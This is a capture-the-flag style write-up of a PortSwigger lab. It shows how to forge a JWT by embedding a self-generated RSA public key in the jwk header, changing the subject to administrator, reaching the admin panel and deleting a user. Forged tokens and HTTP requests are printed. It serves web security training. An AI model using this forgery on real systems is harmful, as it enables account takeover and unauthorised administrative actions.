## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5bb164a8-be14-486a-aad7-5552ccdc37f9)

## Overview :



- `jwk` (JSON Web Key) - Provides an embedded JSON object representing the key.

- `jku` (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.

- `kid` (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.

These user-controllable parameters each tell the recipient server which key to use when verifying the signature. We can  exploit these to inject modified JWTs signed using our own arbitrary key rather than the server's secret. 

#### Injecting self-signed JWTs via the jwk parameter 

The `jwk` header paramete can be used to embed their public key directly within the token itself in JWK format. 

```json
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```
> - Ideally, servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured
> servers sometimes use any key that's embedded in the jwk parameter.
> - You can exploit this behavior by signing a modified JWT using your own RSA private key, then embedding the matching public key in the jwk header.

## Solution :

> The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key
> directly in the token. However, it fails to check whether the provided key came from a trusted source. 

Login as wiener using the credentials provided.

Since we are a normal user we're not able to view the **/admin** panel.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9545cc0f-bbfd-46a1-adda-438845fee7f7)

The following are the requests that has JWT in it.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/414d827e-9d34-4705-a402-5e9a7f67181c)

Send the GET request to /admin to repeater tab.

The request contains the following JWT in the cookie header. 

```http
GET /admin HTTP/2
Host: 0a8f00e304732c958015c63500a0008a.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=eyJraWQiOiJjN2U4MmI3ZS0zNTkxLTQ2ZTQtOWJlNi0xYjY3MzMxZmY3OWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTcxMjAwNn0.XrJ-yijT2KYMu-RQHh--HyV_TKBrRgXkElBvjG---7adku0Flr4YTOUuc7sRKJygw7FGT5VAJQcBnLEq9Xu6Ovv-6dMs_cSY0US4FXJSRQhfjgeWow2hZ5O19xMiFUp7BNZcIsYB-ynbZoYjrLioldpBDU-FFvwyXJBdsIUh41p5FnnVQO7_oD2c5Nkrjjs8RbJlWgjkF2ULRiVZPinP0JUck6RIj5Xlhhi3rS0PmMbnKDxgcdJs6USNQO3PR6OasHvnJD6Wj9w1cA0QiCyuXclThBWg9Ln1le4uN0DmtjDhgd-z9SqO95pN43PMLeAu25Jd20B3GQGE6NSVAqG9kA
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

Decode it using [jwt.io](https://jwt.io).

**Header -**

```json
{
    "kid": "c7e82b7e-3591-46e4-9be6-1b67331ff79c",
    "alg": "RS256"
}
```

**Payload -**

```json
{
    "iss": "portswigger",
    "sub": "wiener",
    "exp": 1695712006
}
```

### Injecting self-signed JWTs via the jwk parameter -

1. Goto **JWT Editor** & create new RSA key. Once created we can see that it is added in the JWT Editor window.
   ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/2024984a-715c-440b-a246-db247d99d80c)
2. Go to `JSON Web Token` tab. Change the Payload from `"sub" : "wiener"` to `"sub : "administrator""`.
3. Click on `Attack` -> `Embedded JWK`
4. In the dialog box , select the RSA signing key which we created.
   ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/7b4db1e5-2b49-43d5-9a9e-17f8e879739d)

Now the header has been signed with the RSA key which we generated.

```json
{
    "kid": "d2285b5d-eac5-489d-9ee4-7a0d5009b7ec",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "d2285b5d-eac5-489d-9ee4-7a0d5009b7ec",
        "n": "1Zbr8iihj1tRTF7aoZKw4Hn4TJL1HnhrxqFW9J496XU70vmHsLI62muk351UqYNeqURoAKuFcOQM7Uwr16jIiQbUWesKcdOmgguWMtQZeKp2y2r2g1QpYP9wYQVvGEPFrvAMksNPRX5XMsEgvcfLrCDmo7R7baLVDx5p0_b6f_B088accHtd8SuJspmEbHKewQ46g-KkzRWtKAwnrGG2myncY2GwHhbClybCUYxgwSI8GyYOJs5aVjOezAvxUkNSSw3qNyAJK3LltHQAxbQxQxDrEujPrPH5tHDmD9zfolmM-Isns1XFsPRVhIxmc2BFSo6tvBCch-vFTWpefyzw-Q"
    }
}
```

Now we have a new JWT as per our modifications,

```
eyJraWQiOiJkMjI4NWI1ZC1lYWM1LTQ4OWQtOWVlNC03YTBkNTAwOWI3ZWMiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6ImQyMjg1YjVkLWVhYzUtNDg5ZC05ZWU0LTdhMGQ1MDA5YjdlYyIsIm4iOiIxWmJyOGlpaGoxdFJURjdhb1pLdzRIbjRUSkwxSG5ocnhxRlc5SjQ5NlhVNzB2bUhzTEk2Mm11azM1MVVxWU5lcVVSb0FLdUZjT1FNN1V3cjE2aklpUWJVV2VzS2NkT21nZ3VXTXRRWmVLcDJ5MnIyZzFRcFlQOXdZUVZ2R0VQRnJ2QU1rc05QUlg1WE1zRWd2Y2ZMckNEbW83UjdiYUxWRHg1cDBfYjZmX0IwODhhY2NIdGQ4U3VKc3BtRWJIS2V3UTQ2Zy1La3pSV3RLQXduckdHMm15bmNZMkd3SGhiQ2x5YkNVWXhnd1NJOEd5WU9KczVhVmpPZXpBdnhVa05TU3czcU55QUpLM0xsdEhRQXhiUXhReERyRXVqUHJQSDV0SERtRDl6Zm9sbU0tSXNuczFYRnNQUlZoSXhtYzJCRlNvNnR2QkNjaC12RlRXcGVmeXp3LVEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTU3MTIwMDZ9.rGj2YBkg9DXzrmnABuFwB2JIyE6nBJpS0SZVfNm4Rus7snt3hPPTr3CEBEJX6W274UzHPYtxClRj-g8YFYxtGbpmKCfssPqP5K0Vay7XQJ-5qU3KguCgSkHuEBoK5HntSRxHtsyTjrdB7NOluz8OHuEGEEecnnSZWaAGAXckhPVvB6DZualYdtKXRlxW_z76ngLjO8x7u2vJmsKkPqVZkSbKNTW3oOLVBcsZcgeSuMM9E0IcTSm8Vtu1viNut4rLOiXFUvH8Xqe9b1hYMuta26IBpv70hk-g9iWSVAinRt6wRDS0hg_F6OtP3vL9eQHxnw_RIEHbjByonkZDowQG6Q
```

Replace the original JWT with the above & send the request.

Now we can able to access the admin panel

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f4dabe31-7c6c-4448-b001-b4ea728b89ba)

Delete the user carlos to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/76246fd0-32f7-447e-9fb5-5ea0cd72ce56)

